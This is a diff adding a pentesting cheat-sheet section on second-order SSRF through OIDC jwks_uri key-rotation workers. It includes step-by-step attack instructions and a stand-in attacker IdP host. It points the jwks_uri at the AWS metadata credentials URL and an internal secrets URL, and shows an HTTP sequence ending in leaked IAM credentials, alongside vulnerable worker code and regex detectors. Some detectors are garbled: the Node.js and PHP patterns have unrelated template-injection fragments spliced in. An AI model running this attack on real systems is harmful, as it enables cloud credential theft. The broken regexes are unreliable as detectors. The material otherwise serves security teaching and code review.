@@ -2426,4 +2426,299 @@ XSL Content File :
 
 ***
 
+#### Second-Order SSRF via Asynchronous OIDC Discovery (JWKS URI) Key Rotation Pipelines
+
+{% stepper %}
+{% step %}
+Map the entire target system using Burp Suite. Focus on hyper-scale B2B platforms offering "Bring-Your-Own-Identity" (BYO-IdP) features via OAuth2, OpenID Connect (OIDC), or SAML
+{% endstep %}
+
+{% step %}
+Draw the application's architecture and trust boundaries inside XMind
+{% endstep %}
+
+{% step %}
+Decompile or reverse engineer the application according to the underlying technology stack
+{% endstep %}
+
+{% step %}
+Identify the "Zero-Trust Identity Federation" architecture. During onboarding, Tenant Administrators provide an `Issuer URL` (e.g., `[https://idp.attacker.com](https://idp.attacker.com)`)
+{% endstep %}
+
+{% step %}
+Investigate the OIDC Auto-Discovery optimization. To avoid manually configuring cryptographic signing keys, the backend platform automatically appends `/.well-known/openid-configuration` to the provided Issuer URL to fetch the Identity Provider's metadata
+{% endstep %}
+
+{% step %}
+Analyze the perimeter SSRF defenses. The application rigorously validates the provided `Issuer URL`. It resolves the domain, ensures it points to a public IP address, and verifies it operates over `HTTPS`. Only then does it fetch the configuration
+{% endstep %}
+
+{% step %}
+Discover the architectural delegation of trust: The OIDC configuration is a JSON document containing a critical property: `"jwks_uri"`. This URI dictates where the platform should download the cryptographic public keys (JSON Web Key Set)
+{% endstep %}
+
+{% step %}
+Observe the latent vulnerability: Developers explicitly assume that if the primary `Issuer URL` passes the strict SSRF filter, the resulting metadata (the URLs contained _within_ the discovery document) is inherently secure and authoritative. They fail to apply the SSRF validation algorithm to the extracted `jwks_uri`
+{% endstep %}
+
+{% step %}
+Investigate the "Key Rotation" background worker. Cryptographic keys expire. To prevent authentication downtime, an asynchronous background microservice periodically awakens (e.g., every 60 minutes) to poll the cached `jwks_uri` and update the active keys
+{% endstep %}
+
+{% step %}
+Understand the execution context: Because this background worker processes non-user-facing system tasks, it often resides deep within the internal Kubernetes cluster, entirely bypassing the stringent external API Gateway firewalls and ingress SSRF restrictions
+{% endstep %}
+
+{% step %}
+Formulate the Asynchronous SSRF payload. Setup a legitimate, external OIDC provider. Register its `Issuer URL` in the target platform to successfully bypass the initial onboarding SSRF filters
+{% endstep %}
+
+{% step %}
+Once the platform has cached your configuration, maliciously modify your external OIDC server's `.well-known/openid-configuration` file. Change the `jwks_uri` to point to a highly classified internal endpoint (`[http://169.254.169.254/latest/meta-data/iam/security-credentials/](http://169.254.169.254/latest/meta-data/iam/security-credentials/)` or `[http://internal-kube-api.svc.cluster.local:8080/secrets](http://internal-kube-api.svc.cluster.local:8080/secrets)`)
+{% endstep %}
+
+{% step %}
+Wait for the background key-rotation worker to trigger its polling cycle
+{% endstep %}
+
+{% step %}
+The internal worker retrieves the poisoned `jwks_uri` from the cache and blindly executes an HTTP GET request directly against the internal network endpoint
+{% endstep %}
+
+{% step %}
+The internal endpoint returns non-JWKS data (e.g., AWS STS credentials). The worker's strict JSON parser fails to map the response to an array of cryptographic keys. The global exception handler catches the parsing error and logs the _raw HTTP response body_ to the centralized Tenant Observability Dashboard ("Key Rotation Failure: ..."). The attacker accesses their tenant logs, exfiltrating the internal cloud credentials
+
+**VSCode Regex Detection**
+
+{% tabs %}
+{% tab title="C#" %}
+```regexp
+\b(?:var\s+jwksUri\s*=\s*(?:oidcConfig\.JwksUri|.*jwks_uri)[\s\S]{0,120}?httpClient\.GetAsync\s*\(\s*jwksUri\s*\)|oidcConfig\.JwksUri[\s\S]{0,150}?(?:HttpClient|WebClient|GetAsync|SendAsync)|jwks_uri[\s\S]{0,150}?GetAsync)
+```
+{% endtab %}
+
+{% tab title="Java" %}
+```regexp
+\b(?:String\s+jwksUri\s*=\s*configNode\.get\s*\(\s*"jwks_uri"\s*\)[\s\S]{0,120}?restTemplate\.getForObject|jwks_uri[\s\S]{0,150}?(?:RestTemplate|WebClient|HttpClient|execute)|getForObject\s*\(\s*jwksUri)
+```
+{% endtab %}
+
+{% tab title="PHP" %}
+```regexp
+\b(?:\$jwksUri\s*=\s*\$oidcConfig\[['"]jwks_uri['"]\][\s\S]{0,120}?Http::get\s*\(\s*\$jwksUri\s*\)|jwks_uri[\s\S]{0,150}?(?:Http::get|curl_exec|file_get_contents)|\$jwksUri[\s\S]{0,100}?curl)
+```
+{% endtab %}
+
+{% tab title="Node.js" %}
+```regexp
+\b(?:nunjucks\.compile\s*\([\s\S]{0,100}?(?:customWebhookBody|payload|template)|nunjucks\.renderString\s*\([\s\S]{0,120}?(?:payload|template)|Handlebars\.compile\s*\([\s\S]{0,120}?(?:payload|template)|ejs\.compile\s*\([\s\S]{0,120}?(?:payload|template))\b(?:const\s+jwksUri\s*=\s*oidcConfig\.jwks_uri[\s\S]{0,120}?fetch\s*\(\s*jwksUri\s*\)|jwks_uri[\s\S]{0,150}?(?:fetch|axios\.get|https\.get|request)|const\s+\w*jwks\w*\s*=\s*await\s+fetch)
+```
+{% endtab %}
+{% endtabs %}
+
+**RipGrep Regex Detection**
+
+{% tabs %}
+{% tab title="C#" %}
+```regexp
+var\s+jwksUri\s*=\s*oidcConfig\.JwksUri.*httpClient\.GetAsync|oidcConfig\.JwksUri.*GetAsync|jwks_uri.*GetAsync
+```
+{% endtab %}
+
+{% tab title="Java" %}
+```regexp
+String\s+jwksUri\s*=\s*configNode\.get\("jwks_uri"\).*restTemplate\.getForObject|jwks_uri.*restTemplate|getForObject\(.*jwksUri
+```
+{% endtab %}
+
+{% tab title="PHP" %}
+```regexp
+\$twig->createTemplate\(\$customPayload\)|createTemplate\(.*\$payload|Blade::compileString\(.*payload\$jwksUri\s*=\s*\$oidcConfig\['jwks_uri'\].*Http::get\(\$jwksUri\)|jwks_uri.*Http::get|jwksUri.*curl
+```
+{% endtab %}
+
+{% tab title="Node.js" %}
+```regexp
+const\s+jwksUri\s*=\s*oidcConfig\.jwks_uri.*fetch\(jwksUri\)|jwks_uri.*fetch|jwksUri.*axios
+```
+{% endtab %}
+{% endtabs %}
+
+**Vulnerable Code Pattern**
+
+{% tabs %}
+{% tab title="C#" %}
+```csharp
+public class JwksRotationWorker : BackgroundService
+{
+    private readonly HttpClient _internalClient;
+    private readonly ILogger<JwksRotationWorker> _logger;
+
+    public async Task RotateKeysAsync(TenantIdpConfig config) 
+    {
+        try 
+        {
+            // [1]
+            // [2]
+            var jwksUri = config.CachedOidcMetadata.JwksUri;
+
+            // [3]
+            // [4]
+            var response = await _internalClient.GetAsync(jwksUri);
+            response.EnsureSuccessStatusCode();
+
+            var rawJwks = await response.Content.ReadAsStringAsync();
+            var keys = JsonConvert.DeserializeObject<JsonWebKeySet>(rawJwks);
+            
+            await _keyStore.UpdateKeysAsync(config.TenantId, keys);
+        }
+        catch (JsonReaderException ex) 
+        {
+            // Fatal logging error: echoes the unparsed internal response to tenant diagnostic logs
+            _logger.LogError("Tenant {TenantId} JWKS parsing failed. Raw Response: {RawResponse}", config.TenantId, ex.Message);
+        }
+    }
+}
+```
+{% endtab %}
+
+{% tab title="Java" %}
+```java
+@Component
+public class JwksRotationWorker {
+
+    @Autowired
+    private RestTemplate internalClient;
+    @Autowired
+    private TenantLogService tenantLogger;
+
+    @Scheduled(fixedRate = 3600000)
+    public void rotateKeys(TenantIdpConfig config) {
+        try {
+            // [1]
+            // [2]
+            String jwksUri = config.getCachedOidcMetadata().getJwksUri();
+
+            // [3]
+            // [4]
+            ResponseEntity<String> response = internalClient.getForEntity(jwksUri, String.class);
+            
+            ObjectMapper mapper = new ObjectMapper();
+            JsonWebKeySet keys = mapper.readValue(response.getBody(), JsonWebKeySet.class);
+            
+            keyStore.updateKeys(config.getTenantId(), keys);
+
+        } catch (JsonProcessingException ex) {
+            // Exfiltrates the internal response to the tenant's visible error dashboard
+            tenantLogger.logError(config.getTenantId(), "JWKS Update Failed. Invalid schema received: " + ex.getOriginalMessage());
+        }
+    }
+}
+```
+
+
+{% endtab %}
+
+{% tab title="PHP" %}
+```php
+class JwksRotationWorker implements ShouldQueue
+{
+    protected $tenantLogger;
+
+    public function handle(TenantIdpConfig $config): void 
+    {
+        try {
+            // [1]
+            // [2]
+            $jwksUri = $config->cachedOidcMetadata['jwks_uri'];
+
+            // [3]
+            // [4]
+            $response = Http::get($jwksUri);
+            
+            $keys = json_decode($response->body(), true, 512, JSON_THROW_ON_ERROR);
+            
+            $this->keyStore->updateKeys($config->tenantId, $keys);
+
+        } catch (\JsonException $ex) {
+            // Logs the raw internal endpoint output
+            $this->tenantLogger->error($config->tenantId, "Failed to parse JWKS. Received: " . $response->body());
+        }
+    }
+}
+```
+{% endtab %}
+
+{% tab title="Node.js" %}
+```javascript
+class JwksRotationWorker {
+    static async rotateKeys(config) {
+        let rawResponse = "";
+        try {
+            // [1]
+            // [2]
+            let jwksUri = config.cachedOidcMetadata.jwks_uri;
+
+            // [3]
+            // [4]
+            let response = await fetch(jwksUri);
+            rawResponse = await response.text();
+            
+            let keys = JSON.parse(rawResponse);
+            
+            await keyStore.updateKeys(config.tenantId, keys);
+
+        } catch (err) {
+            // Flushes the exfiltrated internal data to the UI diagnostics portal
+            await tenantLogger.logError(config.tenantId, `JWKS Rotation Failed. Content: ${rawResponse}`);
+        }
+    }
+}
+```
+{% endtab %}
+{% endtabs %}
+{% endstep %}
+
+{% step %}
+\[1] The system supports dynamic Identity Federation by caching the external Identity Provider's OIDC configuration metadata during the initial, strictly validated onboarding phase, \[2] The backend trusts the cached configuration implicitly, operating under the assumption that if the parent `Issuer URL` was safe, its child endpoints (`jwks_uri`) are cryptographically bound to the same safe domain, \[3] To support seamless key rotation, a background worker runs asynchronously. This worker utilizes a generic, un-sandboxed internal HTTP client, entirely bypassing the edge-layer SSRF mitigation logic (which only inspects user-facing API calls), \[4] The execution sink. The background worker blindly executes a `GET` request against the attacker's poisoned URI, successfully hitting internal infrastructure. Because the internal endpoint (e.g., AWS Metadata) returns plaintext instead of a structured JWKS array, the JSON parser throws an exception. The exception handler inadvertently acts as the exfiltration mechanism, writing the classified internal response into a diagnostic log accessible to the Tenant Administrator
+
+```http
+// 1. Attacker (Tenant Admin) onboards a custom IdP using a valid, external domain to bypass the SSRF filter.
+POST /api/v1/sso/configure HTTP/1.1
+Host: api.enterprise.tld
+Authorization: Bearer <tenant_token>
+
+{"issuerUrl": "https://idp.attacker.com/"}
+
+// 2. The Enterprise Backend validates idp.attacker.com (Public IP, valid TLS).
+// 3. The Backend fetches https://idp.attacker.com/.well-known/openid-configuration and caches it.
+// 4. The Attacker updates their external server's openid-configuration file:
+// { "jwks_uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/production-role" }
+
+// 5. The asynchronous JwksRotationWorker triggers. It reads the updated jwks_uri and fetches it.
+// 6. The worker's HTTP client bypasses ingress filters, hitting the AWS IMDSv1 endpoint.
+// 7. The worker attempts to JSON.parse the AWS STS credentials, fails, and logs the response.
+
+// 8. The Attacker queries their Tenant Diagnostic Logs:
+GET /api/v1/tenant/diagnostics/logs HTTP/1.1
+Host: api.enterprise.tld
+Authorization: Bearer <tenant_token>
+
+// 9. The API returns the exfiltrated Cloud IAM credentials.
+HTTP/1.1 200 OK
+{
+  "logs": [
+    "[ERROR] JWKS Rotation Failed. Content: {\"Code\":\"Success\",\"AccessKeyId\":\"ASIA...\",\"SecretAccessKey\":\"...\"}"
+  ]
+}
+```
+{% endstep %}
+
+{% step %}
+To deliver seamless Multi-Tenant Single Sign-On without manual cryptographic key management, platform engineers implemented OIDC Auto-Discovery. The security perimeter relied on rigorous validation of the user-provided `Issuer URL` at the moment of ingress. However, they failed to recognize that OIDC discovery represents a transitive trust boundary. By implicitly trusting the `jwks_uri` returned within the third-party configuration payload, the architecture deferred network routing authority to an external actor. The attacker exploited this by modifying their external metadata after the initial validation phase, injecting a highly classified internal cloud IP. The vulnerability incubated until the asynchronous key-rotation worker awoke. Operating deep inside the trusted internal mesh and bypassing edge SSRF filters, the worker executed the internal request. The resulting parsing failure inadvertently weaponized the application's own error handling mechanisms, exfiltrating the internal cloud orchestration secrets directly to the attacker's diagnostic dashboard
+{% endstep %}
+{% endstepper %}
+
+***
+
 ## Cheat Sheet
